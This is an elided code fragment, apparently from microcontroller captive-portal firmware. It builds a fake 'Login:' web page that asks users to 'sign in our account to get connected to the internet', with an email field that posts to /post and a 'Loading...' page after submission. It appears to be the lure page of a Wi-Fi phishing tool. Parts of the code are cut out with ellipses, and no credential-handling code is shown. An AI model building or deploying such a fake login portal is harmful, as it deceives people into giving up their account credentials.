...
#define TITLE "Login:"
#define BODY "Sign in our account to get connected to the internet."
#define POST_TITLE "Loading..."
...
String footer() {
  return
    "<br><footer><div><center><p>Copyright&#169; 2021-2022 | All rights reserved.</p></center></div></footer>";
}
...
String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post>" +
         "<b> Email:   </b> <center> <input  type=text autocomplete=email name=email placeholder=Email@gmail.com></center>" +
         ...
         //SUBMIT
         "<center><input type=submit  style=background:#08B794;font-size:17px;color:white;cursor:pointer;  value=\"Login\"></center></form>" + footer();
